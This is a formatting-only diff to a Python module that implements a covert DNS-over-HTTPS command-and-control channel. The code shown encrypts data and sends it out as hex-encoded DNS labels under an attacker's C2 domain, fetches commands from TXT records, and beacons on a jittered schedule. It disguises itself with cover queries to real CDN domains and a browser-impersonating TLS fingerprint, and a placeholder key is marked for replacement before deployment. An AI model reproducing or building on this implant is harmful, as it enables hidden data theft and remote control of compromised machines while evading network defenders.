@@ -13,6 +13,7 @@ OPSEC constraints:
   - No raw command strings in DNS labels.
   - FORGE_OFFLINE_STRICT=1 disables all queries.
 """
+
 from __future__ import annotations
 
 import base64
@@ -26,10 +27,10 @@ from typing import Optional
 _LOG = logging.getLogger(__name__)
 _OFFLINE = os.getenv("FORGE_OFFLINE_STRICT", "").lower() in ("1", "true", "yes")
 
-_DOH_URL     = "https://1.1.1.1/dns-query"
-_MAX_LABEL   = 40          # chars per DNS label
-_COVER_RATIO = 3           # 1 cover query per N beacon queries
-_COVER_DOMAINS = [         # legitimate CDN domains for cover traffic
+_DOH_URL = "https://1.1.1.1/dns-query"
+_MAX_LABEL = 40  # chars per DNS label
+_COVER_RATIO = 3  # 1 cover query per N beacon queries
+_COVER_DOMAINS = [  # legitimate CDN domains for cover traffic
     "cdn.cloudflare.com",
     "ajax.googleapis.com",
     "cdnjs.cloudflare.com",
@@ -50,17 +51,17 @@ class DNSChannel:
 
     def __init__(
         self,
-        c2_domain:   str,
+        c2_domain: str,
         session_key: str = "REPLACE_BEFORE_DEPLOY_32_BYTE_KEY",
-        interval:    int = 120,
-        jitter_pct:  int = 25,
+        interval: int = 120,
+        jitter_pct: int = 25,
     ) -> None:
-        self._domain      = c2_domain
-        self._key         = bytes.fromhex(session_key) if len(session_key) == 64 else None
-        self._interval    = interval
-        self._jitter_pct  = jitter_pct
+        self._domain = c2_domain
+        self._key = bytes.fromhex(session_key) if len(session_key) == 64 else None
+        self._interval = interval
+        self._jitter_pct = jitter_pct
         self._query_count = 0
-        self._session     = self._make_doh_session()
+        self._session = self._make_doh_session()
 
     # ── Public interface ───────────────────────────────────────────────────────
 
@@ -69,8 +70,8 @@ class DNSChannel:
         if _OFFLINE:
             return False
         encrypted = self._encrypt(data)
-        labels    = self._encode_labels(encrypted)
-        success   = False
+        labels = self._encode_labels(encrypted)
+        success = False
         for label_chunk in labels:
             fqdn = f"{label_chunk}.{self._domain}"
             if self._doh_query(fqdn, "A"):
@@ -85,7 +86,7 @@ class DNSChannel:
             return None
         self._maybe_cover_query()
         fqdn = f"cmd.{self._domain}"
-        txt  = self._doh_query(fqdn, "TXT")
+        txt = self._doh_query(fqdn, "TXT")
         if not txt:
             return None
         try:
@@ -94,7 +95,7 @@ class DNSChannel:
             return None
 
     def sleep(self) -> None:
-        sigma  = self._interval * (self._jitter_pct / 100)
+        sigma = self._interval * (self._jitter_pct / 100)
         actual = max(10.0, random.gauss(self._interval, sigma))
         time.sleep(actual)
 
@@ -115,14 +116,14 @@ class DNSChannel:
         """
         hex_str = data.hex()
         # Split into pairs, then group into label-sized chunks
-        pairs  = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]
+        pairs = [hex_str[i : i + 2] for i in range(0, len(hex_str), 2)]
         chunks: list[str] = []
         buf: list[str] = []
         length = 0
         for pair in pairs:
             if length + len(pair) + 1 > _MAX_LABEL:
                 chunks.append(".".join(buf))
-                buf    = [pair]
+                buf = [pair]
                 length = len(pair)
             else:
                 buf.append(pair)
@@ -163,7 +164,8 @@ class DNSChannel:
         try:
             from Crypto.Cipher import AES
             from Crypto.Random import get_random_bytes
-            nonce  = get_random_bytes(12)
+
+            nonce = get_random_bytes(12)
             cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
             ct, tag = cipher.encrypt_and_digest(data)
             return nonce + tag + ct
@@ -175,6 +177,7 @@ class DNSChannel:
             return raw
         try:
             from Crypto.Cipher import AES
+
             nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
             cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
             return cipher.decrypt_and_verify(ct, tag)
@@ -185,9 +188,15 @@ class DNSChannel:
     def _make_doh_session():
         try:
             from curl_cffi import requests as cffi_requests
+
             return cffi_requests.Session(impersonate="chrome122")
         except ImportError:
+
             class _NoOp:
-                def get(self, *a, **kw): return type("R", (), {"status_code": 0, "json": lambda: {}})()
-                def close(self): pass
+                def get(self, *a, **kw):
+                    return type("R", (), {"status_code": 0, "json": lambda: {}})()
+
+                def close(self):
+                    pass
+
             return _NoOp()
